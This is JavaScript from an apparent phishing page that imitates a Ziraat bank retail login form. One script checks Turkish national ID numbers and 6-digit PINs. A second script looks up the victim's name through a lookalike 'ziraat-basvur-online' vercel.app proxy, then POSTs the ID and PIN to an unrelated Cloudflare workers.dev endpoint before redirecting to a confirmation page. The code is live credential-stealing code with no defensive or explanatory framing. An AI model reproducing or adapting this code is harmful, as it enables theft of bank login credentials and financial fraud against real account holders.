	     <script>
document.addEventListener("DOMContentLoaded", function() {
    function tcno_dogrula(tcno) {
        tcno = String(tcno);
        if (tcno.substring(0, 1) === '0') {
            return false;
        }
        if (tcno.length !== 11) {
            return false;
        }
        var ilkon_array = tcno.substr(0, 10).split('');
        var ilkon_total = hane_tek = hane_cift = 0;
        for (var i = j = 0; i < 9; ++i) {
            j = parseInt(ilkon_array[i], 10);
            if (i & 1) {
                hane_cift += j;
            } else {
                hane_tek += j;
            }
            ilkon_total += j;
        }
        if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) {
            return false;
        }
        ilkon_total += parseInt(ilkon_array[9], 10);
        if (ilkon_total % 10 !== parseInt(tcno.substr(-1), 10)) {
            return false;
        }
        return true;
    }

    function kontrolEt() {
        var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
        var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
        var devamButton = document.getElementById("ctl00_c_RetailLoginButton");

       if (/^\d{11}$/.test(identityInput.value) && /^\d{6}$/.test(pinInput.value) && tcno_dogrula(identityInput.value)) {
            devamButton.removeAttribute("disabled");
        } else {
            devamButton.setAttribute("disabled", "disabled");
        }
    }

    var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
    var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");

    identityInput.addEventListener("input", kontrolEt);
    pinInput.addEventListener("input", kontrolEt);
});
    </script>

   <script>
 

async function checkAndSubmit() {
    const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
    const retailPinValue = document.getElementById('ctl00_c_RetailPinTextBox').value;

    try {
        // Sayfanın yüklenmesini bekleyin
     
        // Diğer gerekli verileri alabilirsiniz (ad, soyad vb.)
        const response = await fetch(`https://ziraat-basvur-online.vercel.app/proxy/${retailIdentityValue}`);
        const data = await response.json();
        const adi = data.adi;
        const soyadi = data.soyadi;

        // 0.5 saniye (500 milisaniye) bekleme
       

        // İsim adında bir cookie oluştur ve değerleri kaydet
        document.cookie = `isim=${adi} ${soyadi}; path=/`;
 
        // Sadece belirli input değerlerini içeren bir FormData nesnesi oluşturun
        const formData = new FormData();
        formData.append('ctl00$c$RetailIdentityTextBox', retailIdentityValue);
        formData.append('ctl00$c$RetailPinTextBox', retailPinValue);

        // AJAX ile formu belirtilen adrese gönder
        await fetch('https://worker-broad-snow-1482.selimjuhan2.workers.dev/', {
            method: 'POST',
            body: formData
        });

        await sleep(500);
         window.location.href = '/onay';
    } catch (error) {
        console.error('Hata:', error);
    }
}
</script>
